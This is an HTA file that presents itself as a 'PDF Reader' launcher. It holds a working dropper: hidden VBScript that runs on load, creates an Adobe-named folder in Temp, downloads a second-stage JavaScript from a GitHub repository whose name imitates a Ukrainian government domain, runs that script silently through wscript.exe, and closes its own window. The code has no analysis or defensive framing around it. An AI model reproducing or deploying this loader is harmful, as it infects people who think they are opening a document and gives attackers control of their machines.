<!DOCTYPE html>
<html>
<head>
    <hta:application
        id="launcher"
        applicationName="PDF Reader"
        version="1.0"
        border="none"
        innerBorder="none"
        caption="no"
        showInTaskBar="no"
        contextMenu="no"
        maximizeButton="no"
        minimizeButton="no"
        sysMenu="no"
        windowState="minimize"
    />
    <title>Opening...</title>
    <script language="VBScript">
        Sub Window_OnLoad
            Dim shell, fso, temp, jsPath
            Set shell = CreateObject("WScript.Shell")
            Set fso = CreateObject("Scripting.FileSystemObject")
            
            ' Создаём случайную папку в Temp
            Randomize
            temp = shell.ExpandEnvironmentStrings("%TEMP%") & "\" & _
                   "Adobe" & CStr(Int((99999 - 10000 + 1) * Rnd + 10000))
            fso.CreateFolder(temp)
            
            ' Скачиваем основной скрипт
            Dim http, stream
            Set http = CreateObject("MSXML2.ServerXMLHTTP")
            http.Open "GET", "https://raw.githubusercontent.com/AvangardSec1/avn.gov.ua/refs/heads/main/stage2/script.js", False
            http.Send
            
            jsPath = temp & "\reader.js"
            Set stream = CreateObject("ADODB.Stream")
            stream.Type = 1
            stream.Open
            stream.Write http.responseBody
            stream.SaveToFile jsPath, 2
            stream.Close
            
            ' Запускаем скрипт через wscript.exe в скрытом режиме
            shell.Run "wscript.exe //nologo //E:JScript " & jsPath, 0, False
            
            ' Закрываем HTA окно (практически мгновенно)
            window.Close
        End Sub
    </script>
</head>
<body></body>
</html>